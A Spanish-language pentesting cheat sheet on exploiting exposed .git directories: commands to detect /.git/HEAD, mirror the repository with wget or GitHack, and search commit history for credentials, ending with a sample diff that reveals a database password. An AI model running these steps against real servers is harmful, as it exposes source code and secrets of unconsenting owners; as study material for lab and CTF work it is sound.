# .GIT

Tags: #GIT 

**Git** es una herramienta para llevar el historial de cambios de un proyecto. Guarda versiones de los archivos para que puedas ver qué cambió, recuperar una versión anterior y colaborar con otras personas.

## Enumerar desde Web - Repositorio .git expuesto

```bash
# Puedes encontrar el '/.git' haciendo fuzzing en el server 

Paso 1:
# Si al consultar devuelve algo esta expuesto 
❯ curl http://<IP>/.git/HEAD

	ref: refs/heads/main

Paso 2:
# Traer todo el proyecto a Kali 
❯ wget -r "http://IP_Server/.git/"

Paso 3:
# Mirar los commits ya que contienen creds 
❯ git log
	commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)

❯ git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54

# Después de extraer → buscar credenciales (Opcional)
❯ grep -ri "password\|passwd\|secret\|key\|token" ./ 2>/dev/null
```

* [GitHack.py](https://github.com/lijiejie/githack)
```bash 
# Instalación (Opcional)
❯ git clone https://github.com/lijiejie/githack && cd githack

❯ python3 GitHack.py http://<IP>/.git/
# Extraer todos los recursos del proyecto
# Puede contener: credenciales, código fuente, historial de commits

# Otras tools 
❯ git_hacker.py http://<IP>/.git/
❯ git-dump.py http://<IP>/.git/
```

## Enumeración de credenciales desde un directorio 
```bash 
# Enumerar un dir para ver si existe un proyecto .git 
❯ ls -la 

NOTA:
	- Enumerar en carpetas .zip que se descarguen de algun servicio como FTP, WEB, etc...
```

```bash 
# Si existe un .git se puede enumerar de la siguiente manera:
❯ git log    # Mirar si hay commits
	
	commit f89b4ad40ff87ae42da5bd1c5934ddd23ae54b75 (HEAD -> main)
Author: ellen.freeman <ellen.freeman>
Date:   Sun May 24 16:32:12 2026 +0000

    TODO: add a .gitignore

commit ee7e8b58c112747a079730c7f96136a24eba8e9c
Author: ellen.freeman <ellen.freeman>
Date:   Sun May 24 16:31:09 2026 +0000

    initial commit
```

```bash 
❯ git show f89b4ad40ff87ae42da5bd1c5934ddd23ae54b75


commit f89b4ad40ff87ae42da5bd1c5934ddd23ae54b75 (HEAD -> main)
Author: ellen.freeman <ellen.freeman>
Date:   Sun May 24 16:32:12 2026 +0000

    TODO: add a .gitignore

diff --git a/.env.local b/.env.local
index ce5b4cd..4cce7e0 100644
--- a/.env.local
+++ b/.env.local
@@ -1,4 +1,4 @@
 # Environment variables required to connect the app with your Neo4j database
 NEO4J_URI=10.0.0.1
-NEO4J_USER=justin
-NEO4J_PASSWORD=ArepasConQueso2026!
+NEO4J_USER=
+NEO4J_PASSWORD=
```